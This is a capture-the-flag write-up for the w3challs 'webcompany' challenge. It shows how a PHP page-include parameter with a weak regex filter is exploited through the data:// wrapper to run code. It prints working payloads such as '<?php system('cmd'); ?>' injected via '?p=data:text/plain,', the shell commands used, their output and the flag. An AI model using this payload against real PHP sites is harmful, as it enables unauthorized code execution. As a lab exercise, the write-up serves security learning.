# w3challs - webcompany

Description: *The WebCompany asked you to audit its site, to ensure it is secure... The flag is in a file located within the site tree.*

Site link: https://webcompany.hax.w3challs.com

Source code: https://git.w3challs.com/challenges/hax/-/tree/master/webcompany

## first inspection

Upon visiting the site we are presented with a *home* page which is located at **index.php** and we can also access the *services* and *contact* tabs from the interface. These are located at **index.php?p=services** and **index.php?p=contact** respectively and are accessed through the **GET** parameter **p**. Since the server is running **PHP** this might be hinting to an **LFI** vulnerability. Let's take a look at the available source code.

## source code
Here is the file tree:
```
.
├── config.php
├── contact.page.php
├── home.page.php
├── inc
│   ├── footer.inc.php
│   ├── header.inc.php
│   └── security.inc.php
├── index.php
├── services.page.php
└── style
    ├── accueil.jpg
    ├── auteur.png
    ├── bckg.gif
    ├── contact.jpg
    ├── footer_bckg.jpg
    ├── header_bckg.jpg
    ├── header_bckg_main.jpg
    ├── li.gif
    ├── menu_bckg.jpg
    ├── menu_bckg_over.jpg
    ├── realisation1.png
    ├── realisation2.png
    ├── services.jpg
    ├── sidebar_bckg.gif
    ├── sidebar_bckg.jpg
    └── style.css

3 directories, 24 files
```

The only files of interest here are:
* `index.php` which sanitizes the value of the **GET** parameter **p** and loads the corresponding file.
* `config.php` which contains some variables of file names and file extensions that are included in all of the app's php files.
* `inc/security.inc.php` which implements a **secure()** function with regex applied filters, that is used by **index.php** for input sanitization.

The rest are files containing simple HTML and/or PHP code or static files like images/css displayed by the site. 

Checking the source code of `index.php`, it executes a series of if-else type checks. The only part that could possibly be vulnerable is `include $_GET['p'] . $pageExt`, since it **includes** a file specified by the **$_GET['p']** which we control, and appends the extension **.page.php** to it. We need to check how the app sanitizes the input to contemplate our attack options.
The file `inc/security.inc.php` which implements the **secure()** function, checks if the value of **p**:
* **starts** with the `http://` protocol
* **starts** with the `https://` protocol
* **starts** with the `ftp://` protocol
* **starts** with the `ftps://` protocol
* **starts** with the `file://` protocol
* **starts** with the `/` character
* **contains** the `..` substring

If the input matches **any** of these regex applied filters, the app loads the default home page, otherwise it attempts to load the specified file. The sanitization is not too strict so this could be vulnerable to **LFI**.

## vulnerability
My first thought was to try **url encoding** or **doubly url encoding** the input to include files from the server into the web page, while also adding a **null byte** `%00` at the end to trick the app into ignoring the extension added at the end of the input, but this didn't work. URL encoded characters were decoded back and doubly URL encoded characters, as well as the null byte didn't seem to work at all.
After trying some more tricks I started testing **PHP wrappers** and different **protocols**. Many attempts later, I tried out the **data://** protocol, which got me **RCE**, verified using the `?p=data:text/plain,<?php phpinfo(); ?>` payload.

## exploit
Since the challenge doesn't involve any privesc, we only need to find the flag. I used the following payload, only changing the `cmd` each time: `https://webcompany.hax.w3challs.com/index.php?p=data:text/plain,<?php system('cmd'); ?>`.

Running the `id` command tells me I'm a nobody :/  
`uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)`

`ls -a` reveals a directory named `yo`.  
`. .. config.php contact.page.php home.page.php inc index.php services.page.php style yo .page.php`

`ls -a` on the `yo` directory reveals a directory named `dawg`:
`. .. dawg .page.php`

Ok I know where this is going..  

Run `find ./yo -type f` to find all the files recursively in the `yo` directory:
`./yo/dawg/i/herd/you/like/flagz .page.php`

`cat ./yo/dawg/i/herd/you/like/flagz` and we get the flag:
`W3C{d4fuck allow_url_include 1s 0n?!}`